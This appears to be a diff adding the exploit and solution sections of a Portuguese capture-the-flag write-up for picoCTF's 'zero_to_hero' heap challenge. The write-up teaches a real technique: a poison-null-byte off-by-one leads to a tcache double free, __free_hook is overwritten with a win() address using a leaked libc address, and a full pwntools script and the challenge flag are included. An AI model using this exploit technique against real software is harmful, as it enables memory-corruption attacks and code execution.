@@ -141,3 +141,115 @@ Olhando para elas podemos assumir alumas coisas:
 - addPower: aqui verificamos que podemos digitar o tamanho do super poder (chunk), sendo o máximo 1032 (importante), e podemos escrever nesse tamanho. E aí está outra vulnerabilidade, quando escrevemos uma string, o final dela sempre deve ser um byte nulo `\0`, e no código nós podemos escrever exatamente a quantidade que pedimos, e em seguida o `\0` é colocado. Então, se escrevermos no tamanho total, o byte nulo é colocado em uma região que não é da string.
 
 ### 2. Exploit
+Pelo o que foi analisado, já podemos ter uma ideia que o exploit deve ser algo relacionado a HEAP, então o mais importante é saber em qual versão da **libc** nós estamos. No caso, ela já vem junto com o binário, e é a versão 2.29.
+
+Resumindo essa versão, a `tcachebin` já foi implementada, e já contém suas verificações de segurança contra `double-free`. Aqui já podemos assumir algumas coisas:
+
+- Não podemos realizar `double-free` na `tcache`.
+- Não podemos utilizar a `fastbin` pois só podemos ter 6 poderes.
+
+Então como vamos realizar o exploit? Analisando um pouco, é possível chegar na conclusão que podemos fazer um chunk ter 2 tamanhos ao mesmo tampo, como? 
+
+Bom, foi visto que podemos escrever o tamanho total do chunk, e com isso o `\0` é colocado no próximo chunk. Para isso temos que ficar atentos a algumas coisas:
+
+- O chunk que será escrito totalmente deve ser do tamanho máximo, 1032, pois dessa forma a `malloc()` não irá realizar o alinhamento (aumentar o tamanho para os metadados).
+- O segundo chunk deve ter tamanho acima de `0x200` e abaixo de `0x300`, pois quando ele for envenenado, o seu tamanho passará a ser `0x200`, que será devolvido pela `malloc()` quando for requisitado um chunk com tamanho menor do que 512 (não tão menor).
+- É necessário alocar o primeiro chunk, depois alocar o segundo, e só após isso começar a realizar os `free()`, para garantir que eles estarão em sequência na memória.
+
+Com isso conseguimos realizar um `double-free`, forçando o chunk ter 2 tamanhos diferentes, e também conseguimos manipular o `fd` (ponteiro para o próximo chunk na bin). Mas como vamos conseguir chegar na função `win()`? É aí que entra uma carta na manga, no início do código foi vazado o endereço da system, e a system é uma função da **libc**, portanto nós conseguimos quebrar o **ASLR** e temos acesso a qualquer coisa dela. Também podemos ver que a **libc** tem apenas `PARTIAL RELRO`, ou seja, podemos escrever na `.GOT`.
+
+### 3. Solução
+Primeiramente alocamos os dois chunks, um de 1032 e outro de 510, liberamos eles, e alocamos apenas o 1032, preenchendo ele totalmente. Agora nosso segundo chunk está com outro tamanho em seus metadados, `0x200`, então liberamos ele novamente.
+
+A parte pensada para colocar como endereço do `fd` é o `__free_hook`, que é um ponteiro da **libc** chamado quando usamos a função `free()`. Assim, alocamos novamente nosso chunk de 510 passando o endereço do `__free_hook`, e após isso alocamos o mesmo chunk na outra bin (tamanho 500). Se tudo deu certo, a tcache tem que estar assim:
+```
+tcache(1032): vazia
+tcache(510): vazia
+tcahe(500): __free_hook
+```
+Então alocamos novamente um chunk de 500 e passamos como valor o endereço da `win()`, e pronto, basta realizarmos algum `free()` que retornaremos para a `win()` e a flag será popada.
+
+### 3. Solução com Python
+```py
+#O código possui duas vulnerabilidades, a primeira é que os ponteiros não anulados após o free, e a segunda é que podemos escrever exatamente a quantidade informada, e o programa em seguida vai colocar um byte nulo em um espaço fora do chunk.
+#A ideia então é fazer com que o programa altere o campo size de um chunk alocado permitindo nós liberarmos ele duas vezes como se tivesse dois tamanhos.
+
+# ------- Representação -------- #
+# Antes do null byte
+# [chunk1]: 0x0000000000000000      0x0000000000000071
+#           0x0000000000000000      0x0000000000000000
+#           0x0000000000000000      0x0000000000000000
+#           0x0000000000000000      0x0000000000000000
+#           0x0000000000000000      0x0000000000000000
+#           0x0000000000000000      0x0000000000000000
+#           0x0000000000000000      0x0000000000000000
+# [chunk2]: 0x0000000000000000      0x0000000000000111
+# Após o null byte
+# [chunk1]: 0x0000000000000000      0x0000000000000071  
+#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef 
+#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
+#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
+#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
+#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
+#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef 
+# [chunk2]: 0xdeadbeefdeadbeef      0x0000000000000100 <- O taldo Poison NULL Byte
+
+#A ideia é reescrever um dos ponteiros, __free_hook ou __malloc_hook (ponteiros chamados nas respectivas funções).
+
+#IMPORTANTE: o primeiro chunk tem que ser de tamanho 1032, por que? Porque esse é o tamanho máximo permitido para se colocar na Tcache (e pelo programa), aí com isso a malloc não irá fazer ajuste no tamanho (para alinhamento), e portanto podemos escrever nos 1032 bytes alocados. Outro ponto, o segundo chunk pode ser de qualquer valor acima de 500 (não é totalmente qualquer valor), a ideia é o alinhamento ajustar o tamanho do chunk para 0x2.., e com o NULL Byte o valor ficar 0x200 e isso é alocado passando como valor um número menor que 512 (não é qualquer um menor).
+
+from pwn import *
+
+elf = context.binary = ELF("./zero_to_hero")
+libc = elf.libc
+win = 0x00400a02
+p = remote(ip, porta) #Troque pelos valores fornecidos
+
+def create(tam, string):
+    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", str(tam))
+    p.sendlineafter(b"> ", string)
+
+def delete(idx):
+    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", idx)
+
+#Pegando o vazamento da libc.
+p.sendlineafter(b"hero?", b"y")
+p.recvuntil(b"Take this: ")
+system = int(p.recvline()[:-1],16)
+libc.address = system - libc.sym["system"]
+
+#Criando os dois junks adjacentes e liberando eles.
+create("1032", b"A" * 1032)
+create("510", "Vou ser envenenado")
+delete("0")
+delete("1")
+
+#Pegando o chunk de cima e preenchendo ele com o valor total, para que o tamanho do próximo seja envenenado com o NULL Byte.
+create("1032", b"A" * 1032)
+
+#VULNERABILIDADE, liberando o mesmo chunk novamente.
+delete("1")
+
+#Pegando o chunk e reescrevendo o fd dele com o endereço. do __free_hook.
+create("510", p64(libc.sym["__free_hook"]))
+
+#Agora nossa Tcache tem o lixo e em seguida o __free_hook. Retirando o lixo.
+create("500", "Lixo")
+
+#Pegando o __free_hook e escrevendo nele o endereço da win.
+create("500", p64(win))
+
+#Chamando a free novamente, pois agora iremos para a win.
+delete("0")
+
+#FLAG.
+print(p.recvline().decode())
+```
+
+### Flag
+`picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_qiviwkbl}`
+
+## Autor
+[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
